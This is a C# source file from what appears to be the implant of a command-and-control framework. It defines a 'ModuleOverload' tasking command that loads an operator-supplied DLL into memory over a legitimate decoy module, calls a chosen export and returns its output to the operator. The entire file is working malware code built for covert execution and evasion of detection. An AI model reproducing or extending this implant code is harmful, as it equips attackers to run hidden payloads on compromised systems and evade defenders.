using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

using DInvoke.DynamicInvoke;
using DInvoke.ManualMap;

using Drone.Models;

namespace Drone.Commands;

public sealed class ModuleOverload : DroneCommand
{
    public override byte Command => 0x13;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        // find a decoy
        var decoy = Overload.FindDecoyModule(task.Artefact.Length);
        
        if (string.IsNullOrWhiteSpace(decoy))
        {
            await Drone.SendError(task, "Unable to find a suitable decoy module");
            return;
        }

        // map the module
        var map = Overload.OverloadModule(task.Artefact, decoy);
        var export = task.Arguments[0];

        object[] parameters = { };
        
        if (task.Arguments.Length > 1)
            parameters = new object[] { string.Join(" ", task.Arguments.Skip(1)) };

        // run
        var result = (string) Generic.CallMappedDLLModuleExport(
            map.PEINFO,
            map.ModuleBase,
            export,
            typeof(GenericDelegate),
            parameters);

        // return output
        await Drone.SendOutput(task, result);
    }
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
    private delegate string GenericDelegate(string input);
}